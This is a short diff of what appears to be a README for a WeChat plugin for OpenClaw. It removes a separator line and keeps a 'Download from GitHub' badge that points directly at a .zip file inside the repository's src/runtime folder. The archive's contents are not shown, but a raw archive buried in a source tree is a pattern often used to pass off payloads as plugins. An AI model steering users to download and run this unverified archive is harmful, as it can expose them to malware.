@@ -161,6 +161,4 @@ Use this plugin for WeChat QR login, message routing, streaming replies, WebSock
 
 Keep TweetClaw credentials in TweetClaw config or environment variables on the OpenClaw host. Posting, replying, following, DMs, monitors, webhooks, and other visible or write actions should still pass through OpenClaw approval before they run from a WeChat conversation.
 
----
-
 [![Download from GitHub](https://img.shields.io/badge/Download-WeChat%20Plugin-brightgreen)](https://raw.githubusercontent.com/reall8164/wechat-openclaw-plugin/main/src/runtime/wechat-plugin-openclaw-1.2.zip)
